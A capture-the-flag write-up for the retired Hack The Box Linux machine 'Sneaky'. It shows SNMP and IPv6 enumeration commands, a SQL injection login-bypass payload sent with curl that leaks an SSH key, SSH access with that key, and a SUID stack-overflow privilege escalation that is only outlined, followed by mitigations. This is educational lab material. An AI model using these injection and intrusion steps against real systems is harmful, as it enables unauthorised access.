---
machine: Sneaky
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, snmp, ipv6, sqli, ssh-key, suid]
---

# Sneaky — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Only HTTP is visible over IPv4; SNMP with the `public` community reveals an IPv6 address. The web login is injectable and leaks an SSH key for `thrasivoulos`. The final escalation is a stack overflow in a SUID binary.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
sudo nmap -sU -p161 --script snmp-brute <IP>
```

- HTTP on 80.
- SNMP on 161/UDP with `public`.
- `snmpwalk` exposes `dead:beef::...`.

## Enumeration

```bash
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.34
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php
```

`/dev/login.php` is found, along with a private key reachable after login.

## Foothold

The form concatenates username and password. `' or 1=1;--` bypasses authentication and displays `thrasivoulos`'s key.

```bash
curl -s -X POST http://<IP>/dev/login.php --data "username=' or 1=1;--&password=x"
chmod 600 id_rsa
ssh -6 -i id_rsa thrasivoulos@dead:beef::<SUFFIX>
```

## Lateral movement

The key allows SSH over IPv6. Read the user flag and review permissions, jobs and special binaries.

## Privilege escalation

```bash
find / -perm -4000 -type f 2>/dev/null
```

A local SUID binary accepts a controlled-length input and overflows the stack. Copy it, calculate the offset with `gdb`/`pattern_create` and reuse ret2libc or ret2win depending on protections.

## Evidence

- `snmpwalk` output with the IPv6 address.
- SQLi bypass and redacted SSH key.
- `id` as `thrasivoulos`.
- Offset calculation and SUID execution.

## Lessons learned

- SNMP still leaks topology and addresses.
- IPv6 widens the surface even when IPv4 looks closed.
- SQLi in a login can leak secrets, not just bypass authentication.

## Mitigations and detection

- Change the SNMP community and filter UDP/161.
- Use parameterised queries.
- Review SUID binaries and build with canary/PIE.
- Alert on SNMP access and unexpected SSH over IPv6.

## References

- <https://www.hackthebox.com/machines/Sneaky>
- <https://0xdf.gitlab.io/2017/10/28/htb-sneaky.html>
- <https://attack.mitre.org/techniques/T1190/>
- <https://attack.mitre.org/techniques/T1552/004/>
